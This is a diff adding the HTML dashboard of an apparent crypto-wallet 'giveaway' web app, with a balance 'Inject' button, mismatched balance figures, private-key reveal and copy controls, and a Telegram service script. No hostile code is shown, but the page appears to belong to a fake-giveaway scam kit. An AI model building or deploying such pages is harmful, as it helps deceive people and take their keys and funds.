@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Crypto Wallet</title>
+    <link href="wallet-style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <div class="container">
+        <div class="wallet-card">
+            <!-- Header -->
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7"/>
+                    </svg>
+                </button>
+                <div>
+                    <h1>Dashboard</h1>
+                    <p style="color: #6B7280; font-size: 12px; margin: 0;">+ Wallet Created</p>
+                </div>
+                <button class="notification-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/>
+                        <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Balance Card -->
+            <div class="balance-card">
+                <div class="balance-header">
+                    <span>Total Balance</span>
+                    <div class="balance-actions">
+                        <button class="toggle-balance" onclick="toggleBalance()">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                <circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        </button>
+                        <button class="currency-toggle" onclick="toggleCurrency()">USD</button>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/>
+                            <circle cx="6" cy="7" r="4"/>
+                            <rect x="2" y="15" width="8" height="7"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="balance-amount" id="balanceAmount">0.3164 BNB</div>
+                <div class="balance-usd" id="balanceUSD">₦124,995,123</div>
+
+                <div class="action-buttons">
+                    <button class="action-btn" onclick="injectBalance()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="12" y1="5" x2="12" y2="19"/>
+                            <line x1="5" y1="12" x2="19" y2="12"/>
+                        </svg>
+                        Inject
+                    </button>
+                    <button class="action-btn" onclick="showDeposit()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                            <polyline points="7,10 12,15 17,10"/>
+                            <line x1="12" y1="15" x2="12" y2="3"/>
+                        </svg>
+                        Deposit
+                    </button>
+                    <button class="action-btn" onclick="showSend()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="22" y1="2" x2="11" y2="13"/>
+                            <polygon points="22,2 15,22 11,13 2,9 22,2"/>
+                        </svg>
+                        Send
+                    </button>
+                    <button class="action-btn" onclick="goToCalculator()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="4" y="4" width="16" height="16" rx="2" ry="2"/>
+                            <line x1="9" y1="9" x2="9" y2="15"/>
+                            <line x1="15" y1="9" x2="15" y2="15"/>
+                        </svg>
+                        Calculate
+                    </button>
+                </div>
+            </div>
+
+            <!-- Wallet Information -->
+            <div class="wallet-info">
+                <div class="info-header">
+                    <h4>Wallet Information</h4>
+                </div>
+
+                <div class="info-item">
+                    <span class="info-label">Wallet Address</span>
+                    <div class="info-value">
+                        <span class="wallet-address" id="walletAddress">0x0948...2Ec9</span>
+                        <button class="copy-btn" onclick="copyAddress()">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="info-item">
+                    <span class="info-label">Private Key</span>
+                    <div class="info-value">
+                        <span class="private-key" id="privateKey">••••••••••••••••••••••••••••••••</span>
+                        <div class="key-actions">
+                            <button class="toggle-btn" onclick="togglePrivateKey()">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                            <button class="copy-btn" onclick="copyPrivateKey()">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                    </svg>
+                    <span>Never share your private key with anyone. Keep it secure!</span>
+                </div>
+            </div>
+
+            <!-- Giveaway Status -->
+            <div class="status-section">
+                <div class="status-header">
+                    <h4>Minimum Required</h4>
+                    <span class="amount">$15.00</span>
+                </div>
+                <div class="status-header">
+                    <h4>Your Balance</h4>
+                    <span class="amount">$79.11</span>
+                </div>
+                <div class="status-header">
+                    <h4>Eligible Amount</h4>
+                    <span class="amount">$79.11</span>
+                </div>
+
+                <div class="info-note">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    </svg>
+                    <span>Your wallet will be verified before giveaway distribution</span>
+                </div>
+            </div>
+
+            <!-- Recent Activity -->
+            <div class="recent-activity">
+                <h4>Recent Activity</h4>
+                <!-- This will be populated by JavaScript -->
+            </div>
+
+            <!-- Navigation -->
+            <div class="bottom-nav">
+                <button class="nav-btn active" onclick="goToDashboard()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+                    </svg>
+                    <span>Home</span>
+                </button>
+                <button class="nav-btn" onclick="goToCalculator()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="4" y="4" width="16" height="16" rx="2" ry="2"/>
+                        <line x1="9" y1="9" x2="9" y2="15"/>
+                        <line x1="15" y1="9" x2="15" y2="15"/>
+                    </svg>
+                    <span>Calculate</span>
+                </button>
+                <button class="nav-btn" onclick="goToHistory()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <polyline points="12,6 12,12 16,14"/>
+                    </svg>
+                    <span>History</span>
+                </button>
+                <button class="nav-btn" onclick="goToSettings()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="3"/>
+                        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1 1.51V5a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>
+                    </svg>
+                    <span>Settings</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="telegram-service.js"></script>
+    <script src="loading-overlay.js"></script>
+    <script src="dashboard-script.js"></script>
+</body>
+</html>
